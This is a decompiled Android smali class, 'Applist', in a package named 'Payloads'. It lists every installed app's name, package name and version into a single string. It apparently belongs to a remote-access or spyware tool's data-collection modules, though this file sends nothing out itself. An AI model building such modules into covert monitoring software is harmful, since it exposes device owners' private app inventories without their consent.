.class public Lcom/android/ld/Payloads/Applist;
.super Ljava/lang/Object;
.source "Applist.java"


# instance fields
.field context:Landroid/content/Context;

.field list:Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .line 14
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 15
    iput-object p1, p0, Lcom/android/ld/Payloads/Applist;->context:Landroid/content/Context;

    .line 16
    return-void
.end method


# virtual methods
.method public app_list()Ljava/lang/String;
    .locals 11

    .line 19
    iget-object v0, p0, Lcom/android/ld/Payloads/Applist;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->getInstalledPackages(I)Ljava/util/List;

    move-result-object v0

    .line 21
    .local v0, "packs":Ljava/util/List;, "Ljava/util/List<Landroid/content/pm/PackageInfo;>;"
    const/4 v1, 0x0

    .local v1, "i":I
    :goto_0
    :try_start_0
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    const-string v3, "\n"

    if-ge v1, v2, :cond_0

    .line 22
    :try_start_1
    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/content/pm/PackageInfo;

    .line 23
    .local v2, "p":Landroid/content/pm/PackageInfo;
    iget-object v4, v2, Landroid/content/pm/PackageInfo;->applicationInfo:Landroid/content/pm/ApplicationInfo;

    iget-object v5, p0, Lcom/android/ld/Payloads/Applist;->context:Landroid/content/Context;

    invoke-virtual {v5}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    invoke-virtual {v4, v5}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v4

    invoke-interface {v4}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v4

    .line 24
    .local v4, "appname":Ljava/lang/String;
    iget-object v5, v2, Landroid/content/pm/PackageInfo;->packageName:Ljava/lang/String;

    .line 25
    .local v5, "pname":Ljava/lang/String;
    iget-object v6, v2, Landroid/content/pm/PackageInfo;->versionName:Ljava/lang/String;

    .line 26
    .local v6, "versionName":Ljava/lang/String;
    iget v7, v2, Landroid/content/pm/PackageInfo;->versionCode:I

    .line 27
    .local v7, "versionCode":I
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "App Name : "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "\nPackage Name : "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "\nVersion Name : "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v9, "\nCode Version : "

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 29
    .local v8, "fi":Ljava/lang/String;
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v10, p0, Lcom/android/ld/Payloads/Applist;->list:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    iput-object v3, p0, Lcom/android/ld/Payloads/Applist;->list:Ljava/lang/String;

    .line 21
    .end local v2    # "p":Landroid/content/pm/PackageInfo;
    .end local v4    # "appname":Ljava/lang/String;
    .end local v5    # "pname":Ljava/lang/String;
    .end local v6    # "versionName":Ljava/lang/String;
    .end local v7    # "versionCode":I
    .end local v8    # "fi":Ljava/lang/String;
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 31
    .end local v1    # "i":I
    :cond_0
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, p0, Lcom/android/ld/Payloads/Applist;->list:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/android/ld/Payloads/Applist;->list:Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/NullPointerException; {:try_start_1 .. :try_end_1} :catch_0

    .line 35
    goto :goto_1

    .line 33
    :catch_0
    move-exception v1

    .line 34
    .local v1, "npe":Ljava/lang/NullPointerException;
    const-string v2, " "

    iput-object v2, p0, Lcom/android/ld/Payloads/Applist;->list:Ljava/lang/String;

    .line 36
    .end local v1    # "npe":Ljava/lang/NullPointerException;
    :goto_1
    iget-object v1, p0, Lcom/android/ld/Payloads/Applist;->list:Ljava/lang/String;

    return-object v1
.end method
